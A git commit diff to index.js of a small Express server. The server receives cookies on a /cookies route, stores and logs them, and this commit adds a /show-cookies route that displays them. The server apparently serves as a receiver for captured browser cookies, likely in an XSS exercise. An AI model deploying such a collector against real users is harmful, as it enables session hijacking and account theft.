dd1ccfff3549ecb350722cfce68acb14c78fc6b2
Estiven <estivencamachops@gmail.com>
2024-10-17 18:52:08 +0200

    #fix

--- index.js
+++ index.js
@@ -1,5 +1,5 @@
 const express = require('express');
-const bodyParser = require('body-parser');
+const bodyParser = require('body-parser'); // Se utiliza para analizar y manejar las cookies que se envían desde el cliente hasta el servido
 
 const app = express();
 let cookiesAlmacenadas = ""; // Variable para almacenar las cookies
@@ -25,6 +25,10 @@ app.get('/cookies', (req, res) => {
     cookiesAlmacenadas = cookies; // Almacenar las cookies
     console.log('Cookies recibidas:', cookies); 
     res.send('Cookies recibidas correctamente'); 
+});
+
+app.get('/show-cookies', (req, res) => {
+  res.send(`Cookies almacenadas: ${cookiesAlmacenadas}`);
 });
 
 
